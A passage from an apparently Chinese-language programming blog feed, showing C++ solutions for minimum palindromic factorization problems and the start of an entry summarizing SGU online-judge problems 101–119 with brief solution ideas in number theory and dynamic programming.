class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) (x).begin(),(x).end()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">" = "</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">" = "</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> P = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">char</span> s[N], t[N];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> PL[N], GPL[N];</span><br><span class="line">tuple&lt;<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>&gt; g[M], G[M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">inc</span><span class="params">(<span class="keyword">int</span> &amp;x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((x += y) &gt;= P) x -= P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Palindromic</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *S = str - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">int</span> G_size = <span class="number">0</span>;</span><br><span class="line">PL[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">rep(j, <span class="number">1</span>, n + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> i, d, k, g_size = <span class="number">0</span>;</span><br><span class="line">swap(g_size, G_size);</span><br><span class="line">rep(_, <span class="number">0</span>, g_size) g[_] = G[_];</span><br><span class="line"></span><br><span class="line">rep(_, <span class="number">0</span>, g_size) &#123;</span><br><span class="line">tie(i, d, k) = g[_];</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">1</span> &amp;&amp; S[i - <span class="number">1</span>] == S[j])</span><br><span class="line">G[G_size++] = &#123;i - <span class="number">1</span>, d, k&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g_size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> r = -j;</span><br><span class="line">rep(_, <span class="number">0</span>, G_size) &#123;</span><br><span class="line">tie(i, d, k) = G[_];</span><br><span class="line"><span class="keyword">if</span> (i - r != d) &#123;</span><br><span class="line">g[g_size++] = &#123;i, i - r, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (k &gt; <span class="number">1</span>)</span><br><span class="line">g[g_size++] = &#123;i + d, d, k - <span class="number">1</span>&#125;;</span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">g[g_size++] = &#123;i, d, k&#125;;</span><br><span class="line">r = i + (k - <span class="number">1</span>) * d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt; <span class="number">1</span> &amp;&amp; S[j - <span class="number">1</span>] == S[j]) &#123;</span><br><span class="line">g[g_size++] = &#123;j - <span class="number">1</span>, j - <span class="number">1</span> - r, <span class="number">1</span>&#125;;</span><br><span class="line">r = j - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">g[g_size++] = &#123;j, j - r, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">G_size = <span class="number">0</span>;</span><br><span class="line">tie(i, d, k) = g[<span class="number">0</span>];</span><br><span class="line">rep(_, <span class="number">1</span>, g_size) &#123;</span><br><span class="line"><span class="keyword">if</span> (get&lt;<span class="number">1</span>&gt;(g[_]) == d)</span><br><span class="line">k += get&lt;<span class="number">2</span>&gt;(g[_]);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">G[G_size++] = &#123;i, d, k&#125;;</span><br><span class="line">tie(i, d, k) = g[_];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">G[G_size++] = &#123;i, d, k&#125;;</span><br><span class="line"></span><br><span class="line">PL[j] = <span class="number">0</span>;</span><br><span class="line">rep(_, <span class="number">0</span>, G_size) &#123;</span><br><span class="line">tie(i, d, k) = G[_];</span><br><span class="line">r = i + (k - <span class="number">1</span>) * d;</span><br><span class="line"><span class="keyword">int</span> m = PL[r - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (k &gt; <span class="number">1</span>) inc(m, GPL[i - d]);</span><br><span class="line"><span class="keyword">if</span> (d &lt;= i) GPL[i - d] = m;</span><br><span class="line"><span class="keyword">if</span> (~j &amp; <span class="number">1</span>) inc(PL[j], m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">" %s"</span>, s);</span><br><span class="line">n = <span class="built_in">strlen</span>(s);</span><br><span class="line">rep(i, <span class="number">0</span>, n / <span class="number">2</span>) &#123;</span><br><span class="line">t[<span class="number">2</span> * i] = s[i];</span><br><span class="line">t[<span class="number">2</span> * i + <span class="number">1</span>] = s[n - <span class="number">1</span> - i];</span><br><span class="line">&#125;</span><br><span class="line">t[n] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">Palindromic(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, PL[n]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Reverses-1"><a href="#Reverses-1" class="headerlink" title="Reverses"></a>Reverses</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">5e5</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">100</span>; <span class="comment">// Ensure M = log(N)</span></span><br><span class="line"><span class="keyword">char</span> s[N], t[N], str[<span class="number">2</span> * N];</span><br><span class="line"></span><br><span class="line">pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; PL[<span class="number">2</span> * N], GPL[<span class="number">2</span> * N];</span><br><span class="line">tuple&lt;<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>&gt; g[M], G[M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Palindromic</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *S = str - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">int</span> G_size = <span class="number">0</span>;</span><br><span class="line">PL[<span class="number">0</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">rep(j, <span class="number">1</span>, n + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> i, d, k, g_size = <span class="number">0</span>;</span><br><span class="line">swap(g_size, G_size);</span><br><span class="line">rep(_, <span class="number">0</span>, g_size) g[_] = G[_];</span><br><span class="line"></span><br><span class="line">rep(_, <span class="number">0</span>, g_size) &#123;</span><br><span class="line">tie(i, d, k) = g[_];</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">1</span> &amp;&amp; S[i - <span class="number">1</span>] == S[j])</span><br><span class="line">G[G_size++] = &#123;i - <span class="number">1</span>, d, k&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g_size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> r = -j;</span><br><span class="line">rep(_, <span class="number">0</span>, G_size) &#123;</span><br><span class="line">tie(i, d, k) = G[_];</span><br><span class="line"><span class="keyword">if</span> (i - r != d) &#123;</span><br><span class="line">g[g_size++] = &#123;i, i - r, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (k &gt; <span class="number">1</span>)</span><br><span class="line">g[g_size++] = &#123;i + d, d, k - <span class="number">1</span>&#125;;</span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">g[g_size++] = &#123;i, d, k&#125;;</span><br><span class="line">r = i + (k - <span class="number">1</span>) * d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt; <span class="number">1</span> &amp;&amp; S[j - <span class="number">1</span>] == S[j]) &#123;</span><br><span class="line">g[g_size++] = &#123;j - <span class="number">1</span>, j - <span class="number">1</span> - r, <span class="number">1</span>&#125;;</span><br><span class="line">r = j - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">g[g_size++] = &#123;j, j - r, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">G_size = <span class="number">0</span>;</span><br><span class="line">tie(i, d, k) = g[<span class="number">0</span>]; </span><br><span class="line">rep(_, <span class="number">1</span>, g_size) &#123;</span><br><span class="line"><span class="keyword">if</span> (get&lt;<span class="number">1</span>&gt;(g[_]) == d)</span><br><span class="line">k += get&lt;<span class="number">2</span>&gt;(g[_]);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">G[G_size++] = &#123;i, d, k&#125;;</span><br><span class="line">tie(i, d, k) = g[_];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">G[G_size++] = &#123;i, d, k&#125;;</span><br><span class="line"></span><br><span class="line">PL[j] = &#123;n + <span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (j % <span class="number">2</span> == <span class="number">0</span> &amp;&amp; S[j - <span class="number">1</span>] == S[j])</span><br><span class="line">PL[j] = min(PL[j], </span><br><span class="line">make_pair(PL[j - <span class="number">2</span>].first, j - <span class="number">2</span>));</span><br><span class="line">rep(_, <span class="number">0</span>, G_size) &#123;</span><br><span class="line">tie(i, d, k) = G[_];</span><br><span class="line">r = i + (k - <span class="number">1</span>) * d;</span><br><span class="line"><span class="comment">// int m = PL[r - 1] + 1;</span></span><br><span class="line">pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; m = &#123;PL[r - <span class="number">1</span>].first + <span class="number">1</span>, r - <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (k &gt; <span class="number">1</span>) m = min(m, GPL[i - d]);</span><br><span class="line"><span class="keyword">if</span> (d &lt;= i) GPL[i - d] = m;</span><br><span class="line"><span class="keyword">if</span> (~j &amp; <span class="number">1</span>) PL[j] = min(PL[j], m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">char</span> *t)</span> </span>&#123;</span><br><span class="line">rep(i, l, r + <span class="number">1</span>) <span class="keyword">if</span> (s[i] != t[i])</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">" %s %s"</span>, s, t);</span><br><span class="line"><span class="keyword">int</span> n = <span class="built_in">strlen</span>(s);</span><br><span class="line">rep(i, <span class="number">0</span>, n) &#123;</span><br><span class="line">str[<span class="number">2</span> * i] = s[i];</span><br><span class="line">str[<span class="number">2</span> * i + <span class="number">1</span>] = t[i];</span><br><span class="line">&#125;</span><br><span class="line">str[<span class="number">2</span> * n] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">Palindromic(str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PL[<span class="number">2</span> * n].first &gt; n) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-1"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">vector</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &gt; ans;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">2</span> * n; r &gt; <span class="number">0</span>; r = PL[r].second) &#123;</span><br><span class="line"><span class="keyword">int</span> L = PL[r].second / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> R = (r - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (!same(L, R, s, t))</span><br><span class="line">ans.emplace_back(make_pair(L + <span class="number">1</span>, R + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans.size());</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> p : ans)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, p.first, p.second);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://arxiv.org/abs/1403.2431" target="_blank" rel="noopener">Fici G, Gagie T, Karkkainen J, et al. A subquadratic algorithm for minimum palindromic factorization[J]. Journal of Discrete Algorithms, 2014: 41-48.</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;内容基本是翻译自论文《A Subquadratic Algorithm for Minimum Palindromic Factorization》，主要对文章进行翻译，力图简化算法的证明过程并给出相应的结论。简化证明过程可能存在不严谨的地方，如有需要可自行查看参考资料中的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SGU 100~152</title>
    <link href="http://mcginn7.github.io/2019/11/15/SGU-100-152/"/>
    <id>http://mcginn7.github.io/2019/11/15/SGU-100-152/</id>
    <published>2019-11-15T02:16:46.000Z</published>
    <updated>2020-02-13T03:20:45.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h1><p>计划一年内（截止 2021 年 1 月 1 日）把 SGU 500 刷完，形式以所有题目给出翻译后的简要题意和解题思路概要。</p><p><a href="https://github.com/McGinn7/ACMSGURU-Code" target="_blank" rel="noopener">AC 代码库</a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>101 <strong>Domino</strong></p><p><strong>题意</strong>  多米诺牌两端标有 0 至 6 的数字，以 <a, b> 形式表示，每张牌均可翻转。要求将 100 个多米诺牌横向放置成一排，相邻的多米诺牌数字需要相同。如 <1, 2><2, 4>。判断是否存在方案，存在的话给出一种排列。</2,></1,></a,></p><p><strong>分析</strong>  将数字 0 至 6 视为图上的点，多米诺牌视为无向边，则问题转化成找出一条欧拉路径，而欧拉路径使用搜索+剪枝解决。</p><hr><p>102 <strong>Coprimes</strong></p><p><strong>题意</strong>  给定 $1\le N \le 10^4$，求 $[1, N)$ 范围内与 $N$  互质的整数个数。</p><p><strong>分析</strong>  求欧拉函数值 $φ(N)=N\prod (1 - \frac {1} {p_i})$，$O(\sqrt N)$ 枚举质因子求解即可。</p><hr><p>103 <strong>Traffic Lights</strong></p><p><strong>题意</strong></p><p><strong>分析</strong> </p><hr><p>104 <strong>Little shop of flowers</strong></p><p><strong>题意</strong>  给 $1\le V \le 100$ 个花瓶和 $1\le F\le 100$ 朵花，以及第 $i$ 朵花放入第 $j$ 个花瓶的美观度 $A_{ij}$。在不改变花的相对顺序条件下，将所有花插入到花瓶中，求最大的美观度之和且输出一种方案。</p><p><strong>分析</strong>  经典的动态规划题目。$dp(i, j)$ 表示前 $i$ 个花瓶中已插入前 $j$ 朵花的最大美观度之和，转移方程：</p><script type="math/tex; mode=display">dp(i, j) = \max\{dp(i - 1, j), dp(i - 1, j - 1) + A_{ji}\}</script><hr><p>105 <strong>Div 3</strong></p><p><strong>题意</strong>  给出 1, 12, 123, 1234, …, 12345678910, … 的序列，求前 $1\le N \le 2^{31}-1$ 个元素中是 3 的倍数的个数。</p><p><strong>分析</strong>  打表找规律，余数序列为 100100…，即每 3 个元素中有 2 个是 3 的倍数。</p><hr><p>106 <strong>The equaion</strong></p><p><strong>题意</strong>  给定二元一次方程 $ax+by+c=0$，已知 $a,b,c$ 和解 $(x, y)$ 的范围 $x \in [x_1, x_2],y\in [y_1, y_2] $。数据保证所有的数字绝对值小于 $10^8$，求解 $(x, y)$ 的个数。</p><p><strong>分析</strong>  使用扩展欧几里得算法计算 $ax_0+by_0=\gcd(a,b)$ 的一组特解 $(x_0, y_0)$，通过乘上缩放因子 $-c/\gcd(a,b)$ 得到 $ax_0+by_0+c=0$ 的特解，通解为</p><script type="math/tex; mode=display">x=x_0+k\frac{b}{\gcd(a,b)} \\y=y_0-k\frac{a}{\gcd(a, b)}</script><p>利用 $[x_1, x_2]$ 和 $[y_1, y_2]$ 分别计算 $k$ 的范围取交集即为解的个数。</p><p>需要注意的是：</p><ol><li>$a$ 或 $b$ 有可能为 0 而导致方程转换为一元一次方程和常数方程；</li><li>系数有可能为负数，注意上取整和下取整计算。</li></ol><hr><p>107 <strong>987654321 problem</strong></p><p><strong>题意</strong>  给定数字 $1\le N \le 10^6$，请求出数字位数为 $N$ 的数 $x$ 的数量，满足 $x^2$ 的末尾为 987654321。</p><p><strong>分析</strong>  本质上求 $x^2\mod 10^9=987654321$，且 $x=v\times 10^9+m$。因为 $v\times 10^9 \equiv 0\pmod {10^9}$，所以只有 $x$ 末尾 9 个数字对结果有影响。此外，通过最后一位为 1 可推断 $x$ 的个位数是 1 或 9，剩下前 8 位可在 $10^8$ 枚举计算，最终有 8 个 9 位数字 $m$ 满足条件。最后分位数 $N<9,n=9,n>9$ 的三种情况讨论输出即可。</9,n=9,n></p><hr><p>108 <strong>Self-numbers 2</strong></p><p><strong>题意</strong>  定义函数 $d(n)$ 为数字 $n$ + 数位和，如 $d(123)=123+1+2+3$。如果一个数 $x$，不存在数 $n$ 使得 $x=d(n)$，则数 $x$ 为 self-number。给定 $1\le N\le 10^7$ 和 $1\le K\le 5000$，进行 $K$ 次询问，第 $i$ 次询问第 $s_i$ 个 self-number，数据保证询问的 self-number 在 $[1,N]$ 中。</p><p><strong>分析</strong>  </p><hr><p>110 <strong>Dundeon</strong></p><p><strong>题意</strong>  给 $1\le N\le 50$ 个三维空间中的球体以及一道激光，球体表面会发射激光。求前 10 个反射激光的球体编号。数据保证激光源在球体外部。</p><p><strong>分析</strong>  </p><hr><p>111 <strong>Very simple problem</strong></p><p><strong>题意</strong>  给定数 $1\le X\le 10^{1000}$，求最大整数 $n$ 满足 $n^2\le X$。</p><p><strong>分析</strong>  </p><hr><p>112 <strong>$a^b-b^a$</strong></p><p><strong>题意</strong>  给定数 $1\le a, b\le 100$，求出 $a^b-b^a$。</p><p><strong>分析</strong>  </p><hr><p>113 <strong>Nearly prime numbers</strong></p><p><strong>题意</strong>  给定 10 个不超过 $10^9$ 的数，判断每个数是否能拆分两个质数之积，即 $n=p_1\times p_2$，其中 $p_1,p_2$ 是质数。</p><p><strong>分析</strong>  根据题意，只需找出 $n$ 的一个约数 $f_1$，则另一个约数即为 $n/f_1$，判断两个约数是否为质数即可，总的时间复杂度 $O(\sqrt n)$。</p><hr><p>114 <strong>Telecasting station</strong></p><p><strong>题意</strong> 一维数轴上有 $1\le N\le 1.5\times 10^4$ 个城镇， 城镇坐标为 $0\lt X_i \lt 5\times 10^4$，其人口数为 $0\lt P_i \lt 5\times 10^4$。现要修建一电视站 $Y$，使得居民的不满程度 $\sum_i P_i|X_i-Y|$ 最小。</p><p><strong>分析</strong>  带权中位数经典题。</p><hr><p>115 <strong>Calendar</strong></p><p><strong>题意</strong>  输入 2001 年 $M$ 月 $N$ 日，输出该天是周几？</p><p><strong>分析</strong>  模拟。</p><hr><p>116 <strong>Index of super-prime</strong></p><p><strong>题意</strong>  定义素数序列为 $P_1\lt P_2\lt \dots\lt P_m\lt\dots$，<strong>超素数</strong>为素数序列中下标也是素数的数，例如3 的下标是 2，7 的下标是 4，因此 3 是超素数，7 不是超素数。现给定一正整数 $N\le 10^4$，将 $N$ 分解成最少数量的超素数之和，并将超素数从大到小输出。若 $N$ 无法由超素数之和表示，则输出 0。</p><p><strong>分析</strong>  现将 $N$ 以内的素数筛选出来，进一步筛选出超素数，个数约 200 个。剩下的问题为<strong>完全背包问题</strong>，动态规划解决即可。</p><hr><p>117 <strong>Counting</strong></p><p><strong>题意</strong>  给定三个整数 $0\lt N, M, K \lt 10001$，询问 $N$ 次：判断给定的数 $x_i^M$ 是否是 $K$ 的倍数。</p><p><strong>分析</strong>  快速幂。</p><hr><p>118 <strong>Digital root</strong></p><p><strong>题意</strong>  求 $A_1+A_1A_2+\dots+A_1A_2\dots A_N$ 的数根，其中 $1\le N\le 1000,0\le A_i\le 10^9$。</p><p><strong>分析</strong>  数根公式：</p><script type="math/tex; mode=display">DigitRoot(x)=\begin{cases}0,  & \text{if $n = 0$} \\[2ex]9, & \text{if $n \neq 0 , n \equiv 0 \pmod 9$} \\[2ex]n \mod 9, & \text{if $n \not \equiv 0 \pmod 9$}\end{cases}</script><p><strong>原理</strong>  数 $x$ 可表示成</p><script type="math/tex; mode=display">x=\sum_i a_i10^i\tag 1</script><p>因为 $10^i \equiv 1\pmod 9$，所以有如下等式：</p><script type="math/tex; mode=display">x\equiv \sum_i a_i\pmod 9\tag 2</script><p>定义数位和函数 $f(x)=\sum a_i$，则等式 2 可写成：</p><script type="math/tex; mode=display">f(x)\equiv x \pmod 9 \tag 3</script><p>数根 $DigitRoot(x)$ 使用 $f(x)$ 表示为：</p><script type="math/tex; mode=display">DigitRoot(x)=f(f(\dots f(x))) \tag 4</script><p>根据等式 3 可得</p><script type="math/tex; mode=display">DigitRoot(x) \equiv x\pmod 9\tag 5</script><hr><p>119 <strong>Magic pairs</strong></p><p><strong>题意</strong>  给定三个正整数 $N, A_0,B_0\le 10^4$，求出所有的 $0\le A, B\lt N$ 对，满足：对于所有的 $(x, y)$，如果 $A_0x+B_0y$ 能被 $N$ 整除，则 $Ax+By$ 也能被 $N$ 整除。</p><p><strong>分析</strong>  根据题意可得</p><script type="math/tex; mode=display">A_0x+B_0y=K_0N\tag 1</script><script type="math/tex; mode=display">Ax+By=KN\tag 2</script><p>联立公式 1 和公式 